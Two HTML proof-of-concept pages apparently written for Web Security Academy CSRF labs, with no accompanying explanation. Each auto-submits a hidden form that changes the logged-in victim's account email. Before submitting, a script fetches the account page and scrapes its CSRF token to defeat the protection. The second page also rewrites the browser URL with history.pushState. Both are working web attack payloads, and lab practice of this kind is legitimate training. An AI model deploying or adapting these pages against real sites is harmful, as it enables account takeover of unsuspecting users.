
```
<html>
<body>
<form action="https://0a9c0024031015bbdb88835b00ef0077.web-security-academy.net/my-account/change-email" method="POST">

<input type="hidden" name="email" value="wienerhasiduhöiashiöasdhuöas&#64;normal&#45;user&#46;net" />

<input id="123" type="hidden" name="csrf" value="asd" />

<input type="submit" value="Submit request" />

</form>

<script>

// Fetch the account page to retrieve the CSRF token

fetch('/../my-account/')

.then(response => response.text())

.then(html => {

// Parse the HTML response

let parser = new DOMParser();

let doc = parser.parseFromString(html, 'text/html');

// Select all input fields and find the CSRF token

let inputFields = doc.querySelectorAll('input');

inputFields.forEach(input => {

if (input.name === 'csrf') {

// Set the hidden CSRF token in our form

document.getElementById('123').value = input.value;

}

});

})

.then(() => {

// Submit the form after the CSRF token is set

document.forms[0].submit();

})

.catch(err => {

console.error('Error fetching CSRF token:', err);

});
</script>
</body>
</html>
```



```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aca00e5042432e780bc1c2800e800b3.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener1&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" id="a" value="" />
      <input type="submit" value="Submit request" />
    </form>

    <script>
      // Fetch the CSRF token from the target page
      fetch('https://0aca00e5042432e780bc1c2800e800b3.web-security-academy.net/my-account')
        .then(response => response.text()) // Assuming the response is HTML
        .then(data => {
          // Parse the response if necessary to extract the CSRF token
          const parser = new DOMParser();
          const doc = parser.parseFromString(data, 'text/html');
          const csrfToken = doc.querySelector('input[name="csrf"]').value;

          // Set the CSRF token in the hidden input field
          document.getElementById('a').value = csrfToken;

          // Once the CSRF token is set, submit the form
          document.forms[0].submit();
        });

      // Update the URL in the browser without reloading the page
      history.pushState('', '', '/');
    </script>
  </body>
</html>
```
